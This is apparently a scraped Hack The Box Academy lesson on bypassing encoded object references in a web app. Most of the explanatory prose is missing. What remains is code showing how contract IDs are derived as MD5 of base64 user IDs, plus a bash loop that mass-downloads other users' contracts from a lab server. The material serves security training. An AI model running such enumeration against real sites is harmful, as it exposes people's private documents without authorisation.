<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/134/section/1187
// Platform Version: V1
// Module ID: 134
// Module Name: Web Attacks
// Module Difficulty: Medium
// Section ID: 1187
// Section Title: Bypassing Encoded References
// Page Title: Web Attacks
// Page Number: 9
-->

# Bypassing Encoded References

**Module Name:** Web Attacks **Page Number:** 9

#### WEB ATTACKS

# Bypassing Encoded References

![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)

![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

``` php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

``` shell-session
[!bash!]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

## Function Disclosure

``` javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

``` shell-session
[!bash!]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

## Mass Enumeration

``` shell-session
[!bash!]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

``` bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

``` shell-session
[!bash!]$ bash ./exploit.sh
[!bash!]$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

# 

# 

#### Questions

####